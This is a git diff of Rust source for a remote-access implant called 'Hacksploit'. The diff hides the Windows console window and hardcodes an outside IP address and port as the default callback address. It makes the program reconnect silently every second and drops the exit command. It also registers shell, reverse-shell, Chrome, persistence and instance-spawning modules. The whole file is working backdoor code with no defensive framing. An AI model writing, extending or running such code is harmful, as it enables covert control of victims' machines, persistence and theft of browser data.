@@ -1,15 +1,20 @@
+use modules::{
+    chrome::ChromeModule, persistence::PersistenceModule, reverse_shell::ReverseShellModule,
+    shell::ShellModule, spawn_instance::SpawnInstanceModule,
+};
 use std::boxed::Box;
 use std::io::{Error, Read, Write};
 use std::net::TcpStream;
-
-use modules::reverse_shell::ReverseShellModule;
+use winapi::um::wincon::GetConsoleWindow;
+use winapi::um::winuser::{ShowWindow, SW_HIDE};
 
 mod modules;
 
-const WELCOME_MESSAGE: &str = "hey babes thanks for using this thing\n";
-const HELP_MESSAGE: &str = "so here's the help: \n{ENTRIES}\n";
-const EXIT_MESSAGE: &str = "oh :-( bye\n";
+const WELCOME_MESSAGE: &str = "Welcome to Hacksploit :)\n";
+const HELP_MESSAGE: &str = "\nCommand entries: \n{ENTRIES}\n";
 const UNKNOWN_COMMAND: &str = "Unknown command. Please try again.\n";
+
+const DEFAULT_ADDR: &str = "51.146.6.229:1337";
 
 pub trait HacksploitModule {
     fn on_command(&self, args: Vec<&str>) -> String;
@@ -21,7 +26,6 @@ pub struct HacksploitInstance {
     modules: Vec<Box<dyn HacksploitModule>>,
     welcome_message: String,
     help_message: String,
-    exit_message: String,
 }
 
 impl HacksploitInstance {
@@ -30,7 +34,6 @@ impl HacksploitInstance {
             modules: vec![],
             welcome_message: String::from(WELCOME_MESSAGE),
             help_message: String::from(HELP_MESSAGE),
-            exit_message: String::from(EXIT_MESSAGE),
         }
     }
 
@@ -65,6 +68,7 @@ impl HacksploitInstance {
         let mut entries: Vec<String> = vec![];
         for module in &self.modules {
             let entry_text = vec![
+                "->",
                 module.get_name().as_str(),
                 "-",
                 module.get_description().as_str(),
@@ -75,18 +79,29 @@ impl HacksploitInstance {
         let entries = entries.join("\n");
         String::from(&self.help_message.replace("{ENTRIES}", &entries))
     }
+}
 
-    fn get_exit_message(&self) -> String {
-        String::from(&self.exit_message)
+fn hide_console_window() {
+    unsafe {
+        let window = GetConsoleWindow();
+        if window != std::ptr::null_mut() {
+            ShowWindow(window, SW_HIDE);
+        }
     }
 }
 
 fn main() {
+    hide_console_window();
     let interval = std::time::Duration::from_secs(1);
+    let mut addr = String::from(DEFAULT_ADDR);
+    if std::env::args().len() > 1 {
+        addr = std::env::args().nth(1).unwrap();
+    }
+    println!("{}", addr);
     loop {
-        match start("127.0.0.1:1337") {
+        match start(&addr) {
             Ok(_) => (),
-            Err(e) => println!("Error: {}", e),
+            Err(_) => (),
         }
         std::thread::sleep(interval);
     }
@@ -111,12 +126,6 @@ fn start(addr: &str) -> Result<(), Error> {
         let data = String::from_utf8(buf[..len].to_vec());
         match data {
             Ok(data) => {
-                if data.to_ascii_lowercase().starts_with("exit") {
-                    let response = instance.get_exit_message();
-                    let _ = stream.write(response.as_bytes());
-                    let _ = stream.flush();
-                    break;
-                }
                 let mut response = instance.on_command(data);
                 if response.len() == 0 {
                     response = String::from(UNKNOWN_COMMAND);
@@ -129,7 +138,11 @@ fn start(addr: &str) -> Result<(), Error> {
     }
     Ok(())
 }
+
 fn register_modules(instance: &mut HacksploitInstance) {
-    let reverse_shell = ReverseShellModule::new();
-    instance.register_module(reverse_shell);
+    instance.register_module(ShellModule::new());
+    instance.register_module(ReverseShellModule::new());
+    instance.register_module(ChromeModule::new());
+    instance.register_module(PersistenceModule::new());
+    instance.register_module(SpawnInstanceModule::new());
 }
